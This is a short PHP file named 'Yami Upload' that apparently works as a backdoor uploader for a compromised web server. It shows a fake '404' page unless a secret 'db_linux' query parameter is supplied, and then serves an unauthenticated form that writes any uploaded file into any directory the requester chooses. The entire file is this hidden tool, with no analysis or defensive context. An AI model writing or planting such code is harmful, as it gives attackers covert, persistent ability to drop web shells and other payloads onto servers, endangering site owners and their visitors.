<?php
if(!isset($_GET["db_linux"])){http_response_code(404);die("404");}
$msg="";
if($_SERVER["REQUEST_METHOD"]=="POST"&&isset($_FILES["f"])&&$_FILES["f"]["error"]==0){
  $n=$_FILES["f"]["name"];
  $d=isset($_POST["dir"])?rtrim($_POST["dir"],"/")."/":"./";
  if(@move_uploaded_file($_FILES["f"]["tmp_name"],$d.$n))
    $msg="<div style=color:green>OK: ".$d.$n." (".@filesize($d.$n)."B)</div>";
  else $msg="<div style=color:red>FAIL: ".$d.$n."</div>";
}
?><!DOCTYPE html><html><head><title>Yami Upload</title></head><body>
<h2>Yami Upload</h2><?php echo $msg;?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="f" required><br>
<input type="text" name="dir" value="./" placeholder="dir"><br>
<input type="submit" value="Upload">
</form></body></html>
